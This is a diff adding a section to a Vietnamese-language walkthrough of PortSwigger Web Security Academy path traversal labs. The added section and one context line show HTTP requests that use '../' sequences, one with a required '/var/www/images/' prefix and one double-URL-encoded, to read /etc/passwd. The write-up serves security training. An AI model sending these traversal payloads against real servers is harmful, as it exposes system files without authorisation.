@@ -118,5 +118,18 @@ GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
 Host: 0a24006d03b4e0b48025dad200d800f9.web-security-academy.net
 ```
 
+### Lab: File path traversal, validation of start of path
+- Mở 1 file ảnh tùy ý ở tab khác và gửi nó đến **Repeater**
+- Ta thấy nó chỉ định bắt đầu từ `/var/www/image/filepath`
+```http
+GET /image?filename=/var/www/images/38.jpg HTTP/2
+Host: 0a3c0092041de0d6800dc688002700bb.web-security-academy.net
+```
+- Thay đổi request để đọc file `/etc/passwd`
+```http
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
+Host: 0a3c0092041de0d6800dc688002700bb.web-security-academy.net
+```
+
 ---
 Goodluck! 🍀🍀🍀
